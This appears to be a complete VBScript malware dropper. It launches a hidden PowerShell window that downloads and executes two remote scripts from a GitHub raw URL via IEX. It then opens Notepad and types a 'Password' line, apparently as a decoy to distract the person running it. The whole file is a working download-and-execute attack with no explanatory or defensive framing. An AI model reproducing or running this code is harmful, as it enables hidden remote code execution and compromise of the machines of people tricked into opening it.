Set oShell = WScript.CreateObject ("WSCript.shell")
oShell.run "powershell -w 1 -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/R1.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/RC.ps1')"
Set oShell = Nothing

Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "c:\windows\system32\notepad.exe", 3, False

WScript.Sleep 1000

Notepad.SendKeys "Password: secure this"
